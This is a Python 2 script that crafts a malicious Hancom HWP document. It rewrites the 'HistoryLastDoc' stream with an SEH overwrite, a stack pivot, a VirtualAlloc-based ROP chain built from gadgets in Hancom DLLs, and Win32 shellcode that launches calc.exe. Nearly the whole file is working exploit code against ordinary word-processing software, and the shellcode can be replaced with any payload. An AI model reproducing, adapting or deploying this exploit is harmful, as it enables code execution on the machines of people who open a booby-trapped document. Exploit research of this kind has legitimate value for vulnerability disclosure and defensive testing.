from pythoncom import *
import sys, zlib, struct

# STGM constants
STGM_READ 			= 0x00000000
STGM_READWRITE 		= 0x00000002
STGM_SHARE_EXCLUSIVE 	= 0x00000010
STGM_CONVERT 			= 0x00020000
STGM_CREATE			= 0x00001000

# STGC constants
STGC_DEFAULT			= 0x0

# STGTY constants
STGTY_STORAGE			= 0x1
STGTY_STREAM			= 0x2 
STGTY_LOCKBYTES		= 0x3
STGTY_PROPERTY			= 0x4

# (sub esp, 0x7f) * 4 + WIN32 calc
shellcode = "\x90\x83\xc4\x7f"*4 + "\xd9\xeb\x9b\xd9\x74\x24\xf4\x5d\x56\x31\xc0\x31\xdb\xb3\x30\x64\x8b\x03\x8b\x40\x0c\x8b\x40\x14\x50\x5e\x8b\x06\x50\x5e\x8b\x06\x8b\x40\x10\x5e\x89\xc2\x68\x98\xfe\x8a\x0e\x52\x89\xeb\x81\xc3\x79\x11\x11\x11\x81\xeb\x11\x11\x11\x11\xff\xd3\x68\x20\x20\x20\x58\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe6\x31\xc9\x88\x4e\x08\x41\x51\x56\xff\xd0\x58\x58\x58\x5a\x68\x7e\xd8\xe2\x73\x52\xff\xd3\x31\xc9\x51\xff\xd0\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x37\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1\xff\xff\xff\x3b\x7c\x24\x28\x75\xde\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3"

def create_rop_chain(shellcode):
	rop_gadgets = ""
	rop_gadgets += struct.pack('<L',0x48009a0A)     # POP EDI # RETN    ** [HimCfgDlg80.dll] **   |  null {PAGE_EXECUTE_READ}
	rop_gadgets += struct.pack('<L',0x48011070)	# ptr to &VirtualAlloc() [IAT HimCfgDlg80.dll]
	rop_gadgets += struct.pack('<L', 0x12020e17) 	# MOV EAX,DWORD PTR DS:[EDI] # ADD DH,DH # RETN
	rop_gadgets += struct.pack('<L', 0x1801c9a5)	# PUSH EAX # ADD BH,BYTE PTR DS:[EAX+2] # POP EBX # ADD ESP,14 # RETN    ** [HncBL80.dll] **   |   {PAGE_EXECUTE_READ}

	for i in range(0x14/4):
		rop_gadgets += struct.pack('<L', 0x41414141)

	# EBX = VirtualAlloc

	rop_gadgets += struct.pack('<L', 0x120016B2)	# POP EDI, RETN
	rop_gadgets += struct.pack('<L', 0x12001656)	# ADD ESP, 0xC # RETN

	rop_gadgets += struct.pack('<L', 0x1209E13E)	# POP EDX #RETN 
	rop_gadgets += struct.pack('<L', 0x480014BB)	# RETN

	rop_gadgets += struct.pack('<L', 0x1209E151)	# POP ECX #RETN
	rop_gadgets += struct.pack('<L', 0x00000000)	# ptr

	rop_gadgets += struct.pack('<L', 0x12001124)	# POP EAX # RETN
	rop_gadgets += struct.pack('<L', 0x00002000)	# dwSize

	rop_gadgets += struct.pack('<L', 0x12034D8C)	# PUSHAD # RETN

	rop_gadgets += struct.pack('<L', 0x00001000)	# flAllocationType
	rop_gadgets += struct.pack('<L', 0x00000040)	# flAllocationType

	rop_gadgets += struct.pack('<L', 0x120220da) 	# PUSH EAX # POP ESI # RETN 0x04    ** [HncXerCore8.dll] **   |   {PAGE_EXECUTE_READ}
	rop_gadgets += struct.pack('<L', 0x12034e83) 	# XCHG EAX,EBP # ADD AL,0 # RETN 0x04    ** [HncXerCore8.dll] **   |   {PAGE_EXECUTE_READ}
	rop_gadgets += struct.pack('<L', 0x41414141)
	
	rop_gadgets += struct.pack('<L', 0x120016B2)	# POP EDI, RETN
	rop_gadgets += struct.pack('<L', 0x41414141)
	rop_gadgets += struct.pack('<L', 0x12099B96)	# strcpy

	rop_gadgets += struct.pack('<L', 0x12034D8C)	# PUSHAD # RETN

	rop_gadgets += shellcode

	# 4-byte align
	if (len(rop_gadgets) % 4 != 0):
		rop_gadgets += "\x90" * (4 - (len(rop_gadgets) % 4))

	return rop_gadgets

def zlib_inflate(data):
	return zlib.compress(data)[2:-4]

def zlib_deflate(data):
	return zlib.decompress(data, -15)

def exploit(dst_stg, src_stg):
	if src_stg == None or dst_stg == None:
		print "[*] Invalid storage."
		sys.exit(-1)

	enum = src_stg.EnumElements()

	for stat in enum:
		if stat[1] == STGTY_STORAGE:
			# Storage
			name = stat[0]
			sub_src_stg = src_stg.OpenStorage(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, None, 0)
			sub_dst_stg = dst_stg.CreateStorage(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)
			exploit(sub_dst_stg, sub_src_stg)

		elif stat[1] == STGTY_STREAM:
			name = stat[0]
			src_strm = src_stg.OpenStream(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, 0)
			dst_strm = dst_stg.CreateStream(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)

			if (src_strm == None or dst_strm == None):
				print "[*] Invalid stream."
				sys.exit(-1)

			if name == "HistoryLastDoc":
				print "[*] HistoryLastDoc is found"

				dummy_size = 676

				rop_chain = create_rop_chain(shellcode)

				nops = struct.pack('<L', 0x12034D8D) * ((dummy_size - len(rop_chain)) / 4)

				nSEH = "AAAA"
				SEH = struct.pack('<L', 0x180221f0)# {pivot 1096 / 0x448} :  # ADD ESP,448 # RETN    ** [HncBL80.dll] **   |   {PAGE_EXECUTE_READ}

				dst_strm.Write(zlib_inflate("1" + "\xff\xff\xff\xff" + nops + rop_chain + nSEH + SEH * 3))
				continue

			src_strm.CopyTo(dst_strm, stat[2])



if __name__ == '__main__':
	print "[*] Start exploit."
	
	src_stg = StgOpenStorage("sample.hwp", None, (STGM_READWRITE | STGM_SHARE_EXCLUSIVE), None, 0)
	dst_stg = StgCreateDocfile('exploit.hwp', (STGM_READWRITE | STGM_SHARE_EXCLUSIVE |  STGM_CREATE), 0)

	exploit(dst_stg, src_stg)

	dst_stg.Commit(STGC_DEFAULT)

	print "[*] End exploit"